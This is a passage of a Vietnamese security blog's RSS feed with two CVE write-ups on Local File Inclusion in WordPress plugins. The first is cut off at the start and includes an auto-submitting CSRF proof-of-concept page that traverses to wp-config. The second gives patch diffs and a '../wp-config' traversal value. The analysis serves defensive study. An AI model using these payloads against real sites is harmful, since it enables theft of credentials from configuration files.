2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;T·∫°o trang web ch·ª©a LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;w41bu1&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost/wp-admin/admin.php&amp;#34; method=&amp;#34;get&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;page&amp;#34; value=&amp;#34;licenseenvato-settings&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;tab&amp;#34; value=&amp;#34;../../../../../../wp-config&amp;#34;&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;        document.forms[0].submit()&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;G·ª≠i link ƒë·∫øn trang web cho admin&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Debugger ƒë√£ nh·∫£y ƒë·∫øn &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-17-cve-2025-39399/result.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ LFI th√†nh c√¥ng&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ LFI th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;‚â§ 1.0.0&lt;/strong&gt; c·ªßa License For Envato cho ph√©p LFI v√¨ &lt;code&gt;include()&lt;/code&gt; d√πng &lt;code&gt;$atts[&#39;template&#39;]&lt;/code&gt; ch∆∞a ƒë∆∞·ª£c x√°c th·ª±c; l·ªó h·ªïng ƒë√£ ƒë∆∞·ª£c v√° trong &lt;strong&gt;1.1.0&lt;/strong&gt; b·∫±ng &lt;code&gt;basename()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; v√† ki·ªÉm tra &lt;code&gt;base_dir&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Vi·ªác &lt;strong&gt;ch·ªâ d√πng &lt;code&gt;sanitize_text_field()&lt;/code&gt; kh√¥ng ƒë·ªß&lt;/strong&gt; ƒë·ªÉ ngƒÉn ch·∫∑n path traversal trong PHP.&lt;/li&gt;&#xA;&lt;li&gt;M·ªçi tham s·ªë ƒë∆∞·ª£c d√πng trong &lt;code&gt;include()&lt;/code&gt; ho·∫∑c thao t√°c file &lt;strong&gt;ph·∫£i ƒë∆∞·ª£c ki·ªÉm so√°t b·∫±ng whitelist ho·∫∑c &lt;code&gt;realpath()&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CSRF k·∫øt h·ª£p LFI&lt;/strong&gt; c√≥ th·ªÉ bi·∫øn l·ªó h·ªïng d√†nh cho admin th√†nh l·ªó h·ªïng &lt;strong&gt;unauthenticated&lt;/strong&gt;, n·∫øu thi·∫øu ki·ªÉm tra nonce.&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn &lt;strong&gt;ki·ªÉm tra k·ªπ input v√† gi·ªõi h·∫°n ph·∫°m vi file c√≥ th·ªÉ truy c·∫≠p&lt;/strong&gt;, ƒë·∫∑c bi·ªát trong c√°c plugin x·ª≠ l√Ω template ho·∫∑c view.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n x√°c th·ª±c v√† r√†ng bu·ªôc ƒë∆∞·ªùng d·∫´n khi include file - kh√¥ng bao gi·ªù tin t∆∞·ªüng d·ªØ li·ªáu t·ª´ request, d√π ƒë√£ ‚Äúsanitize‚Äù.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/subscribe-to-download-lite/vulnerability/wordpress-subscribe-to-download-lite-plugin-1-2-9-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress License For Envato Plugin &amp;lt;= 1.0.0 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30782 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-16-cve-2025-30782/</link>
      <pubDate>Thu, 16 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-16-cve-2025-30782/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-16-cve-2025-30782/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Subscribe to Download Lite&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;‚â§ 1.2.9&lt;/strong&gt; ch·ª©a l·ªó h·ªïng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh &lt;code&gt;include/require&lt;/code&gt;, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30782&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30782&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.2.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/subscribe-to-download-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Subscribe to Download Lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Subscribe to Download Lite&lt;/strong&gt;: &lt;strong&gt;1.2.9&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;1.3.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;#34;stdl-form-wrap stdl-&amp;lt;?php echo esc_attr($form_template); ?&amp;gt; stdl-alias&amp;gt;&amp;#34;&amp;gt;&#xA;    &amp;lt;form method=&amp;#34;post&amp;#34; action=&amp;#34;&amp;#34; class=&amp;#34;stdl-subscription-form&amp;#34; data-form-alias=&amp;#34;stdl&amp;#34;&amp;gt;&#xA;        &amp;lt;?php&#xA;        do_action(&amp;#39;stdl_before_form&amp;#39;, $form_details);&#xA;&#xA;        if (file_exists(STDL_PATH . &amp;#39;inc/views/frontend/form-templates/&amp;#39; . $form_template . &amp;#39;.php&amp;#39;)) {&#xA;            include(STDL_PATH . &amp;#39;inc/views/frontend/form-templates/&amp;#39; . $form_template . &amp;#39;.php&amp;#39;);&#xA;        }&#xA;        do_action(&amp;#39;stdl_after_form&amp;#39;, $form_details);&#xA;        ?&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, &lt;code&gt;$form_template&lt;/code&gt; ƒë∆∞·ª£c concat v√†o chu·ªói v√† include nh∆∞ng kh√¥ng x√°c th·ª±c gi√° tr·ªã ƒë·∫ßu v√†o =&amp;gt; nguy c∆° LFI x·∫£y ra, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$form_template = &amp;#39;../../../../../../../wp-config&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;#34;stdl-form-wrap stdl-&amp;lt;?php echo esc_attr($form_template); ?&amp;gt; stdl-alias&amp;gt;&amp;#34;&amp;gt;&#xA;    &amp;lt;form method=&amp;#34;post&amp;#34; action=&amp;#34;&amp;#34; class=&amp;#34;stdl-subscription-form&amp;#34; data-form-alias=&amp;#34;stdl&amp;#34;&amp;gt;&#xA;&#xA;        &amp;lt;?php&#xA;        do_action(&amp;#39;stdl_before_form&amp;#39;, $form_details);&#xA;&#xA;        $base_dir = realpath(STDL_PATH . &amp;#39;inc/views/frontend/form-templates&amp;#39;) . DIRECTORY_SEPARATOR;&#xA;        $sanitized_template = basename($form_template) . &amp;#39;.php&amp;#39;;&#xA;        $file_path = realpath($base_dir . $sanitized_template);&#xA;&#xA;        if ($file_path &amp;amp;&amp;amp; strpos($file_path, $base_dir) === 0 &amp;amp;&amp;amp; file_exists($file_path)) {&#xA;            include($file_path);&#xA;        }&#xA;        do_action(&amp;#39;stdl_after_form&amp;#39;, $form_details);&#xA;        ?&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° s·ª≠ d·ª•ng &lt;a href=&#34;https://www.php.net/manual/en/function.basename.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;basename()&lt;/code&gt;&lt;/a&gt; ƒë·ªÉ l·∫•y ph·∫ßn t√™n file c·ªßa &lt;code&gt;$form_template&lt;/code&gt; lo·∫°i b·ªè c√°c k√Ω t·ª± traversal sequence &lt;code&gt;../&lt;/code&gt;, v√≠ d·ª•:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;../../../../../../payload.pdf -&amp;gt; payload.pdf&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sau ƒë√≥ concat v√†o &lt;code&gt;$base_dir&lt;/code&gt; v√† l·∫•y ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi b·∫±ng &lt;a href=&#34;https://www.php.net/manual/en/function.realpath.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;realpath&lt;/code&gt;&lt;/a&gt; r·ªìi &lt;code&gt;include()&lt;/code&gt; =&amp;gt; tri·ªát ti√™u ho√†n to√†n kh·∫£ nƒÉng &lt;strong&gt;LFI&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;form-template.php&lt;/code&gt; ch·ª©a code c√≥ l·ªó h·ªïng ·ªü tr√™n ƒë∆∞·ª£c g·ªçi trong &lt;code&gt;stdl-shortcode.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;$form_template = (!empty($atts[&amp;#39;template&amp;#39;])) ? $atts[&amp;#39;template&amp;#39;] : $form_details[&amp;#39;layout&amp;#39;][&amp;#39;template&amp;#39;];&#xA;if (isset($_COOKIE[&amp;#39;stdl_encryption_key&amp;#39;]) &amp;amp;&amp;amp; $this-&amp;gt;check_if_already_subscribed($_COOKIE[&amp;#39;stdl_encryption_key&amp;#39;]) &amp;amp;&amp;amp; empty($form_details[&amp;#39;general&amp;#39;][&amp;#39;always_show&amp;#39;])) {&#xA;    // other logic&#xA;} else {&#xA;    // other logic&#xA;    if ($display_type == &amp;#39;direct&amp;#39;) {&#xA;        include(STDL_PATH . &amp;#39;inc/views/frontend/form-template.php&amp;#39;);&#xA;    } else {&#xA;        ?&amp;gt;&#xA;        &amp;lt;div class=&amp;#34;stdl-popup-outerwrap &amp;lt;?php echo esc_attr($popup_alias_class); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;input type=&amp;#34;button&amp;#34; class=&amp;#34;stdl-popup-trigger stdl-popup-&amp;lt;?php echo esc_attr($form_template); ?&amp;gt;&amp;#34; value=&amp;#34;&amp;lt;?php echo esc_attr($popup_trigger_text); ?&amp;gt;&amp;#34;&amp;gt;&#xA;            &amp;lt;div class=&amp;#34;stdl-popup-innerwrap&amp;#34; style=&amp;#34;display:none;&amp;#34;&amp;gt;&#xA;                &amp;lt;div class=&amp;#34;stdl-overlay stdl-popup-wrapper&amp;#34;&amp;gt;&#xA;&#xA;                    &amp;lt;div class=&amp;#34;stdl-popup-contetn-wrap&amp;#34;&amp;gt;&#xA;                        &amp;lt;a href=&amp;#34;javascript:void(0)&amp;#34; class=&amp;#34;stdl-popup-close&amp;#34;&amp;gt;&amp;lt;i class=&amp;#34;fas fa-times&amp;#34;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&#xA;                            &amp;lt;?php include(STDL_PATH . &amp;#39;inc/views/frontend/form-template.php&amp;#39;);&#xA;                            ?&amp;gt;&#xA;                    &amp;lt;/div&amp;gt;&#xA;                &amp;lt;/div&amp;gt;&#xA;            &amp;lt;/div&amp;gt;&#xA;        &amp;lt;/div&amp;gt;&#xA;        &amp;lt;?php&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$form_template&lt;/code&gt; l√† gi√° tr·ªã c·ªßa &lt;code&gt;$atts[&#39;template&#39;]&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Theo kinh nghi·ªám ph√¢n t√≠ch CVE tr√™n 